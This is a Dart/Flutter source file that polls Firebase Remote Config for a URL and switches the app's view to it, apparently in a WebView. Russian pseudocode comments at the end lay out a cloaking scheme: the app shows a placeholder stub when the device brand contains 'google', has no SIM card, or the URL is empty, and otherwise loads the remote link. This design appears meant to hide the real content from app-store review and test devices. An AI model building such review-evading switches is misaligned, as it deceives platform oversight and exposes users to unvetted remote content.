import 'dart:async';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:firebase_remote_config_example/device_inspector_bloc.dart';
import 'package:firebase_remote_config_example/injection_controller.dart';
import 'firebase_options.dart';

class RemoteConfigSubscribtion {
  String? path;
  final FirebaseRemoteConfig remoteConfig;

  RemoteConfigSubscribtion({required this.remoteConfig});

  Future<void> start() async {
    await remoteConfig.setConfigSettings(RemoteConfigSettings(
      fetchTimeout: const Duration(seconds: 10),
      minimumFetchInterval: const Duration(hours: 1),
    ));

    await remoteConfig.setDefaults({
      'url': '',
    });

    handleTimeout();
    scheduleTimeout(600);
  }

  Future<void> handleTimeout() async {
    // callback function
    await remoteConfig.fetchAndActivate();
    var newUrl = remoteConfig.getString('url');

    if ((newUrl != path) && (newUrl != '')) {
      sl<DeviceInspectorBloc>()
          .add(DeviceInspectorEventChangePath(path: newUrl));
    }
  }

  Timer scheduleTimeout(int seconds) => Timer(
        Duration(seconds: seconds),
        () {
          handleTimeout();
        },
      );
}


// ones() async {
//     try {
//       await OneSignal.shared.promptUserForPushNotificationPermission();
//       await OneSignal.shared.setAppId(“добавляем наш ключ, который скинем в текстовом файле”);
//     } catch (e) {
//       print(e);
//     }
// }

//   if( path.isEmpty){
//   loadFire()
// }else{
//   return path;
//}

// loadFire(){
//  ones(); - функция онсигнал
//   getUrl = получаем значение из firebase_remote_config(“url”);
//   brandDevice = функция на определение бренда телефона
//   simDevice = функция на наличие симкарты
//  Второе условие!!
//    if( getUrl.isEmpty ||  brandDevice.contains(“google”) ||  !simDevice ){
//       return  заглушка ;
//    }else{
//      локальное сохранение ссылки = setString(“key”, getUrl);  -  пример
//      WebView
//   }
// }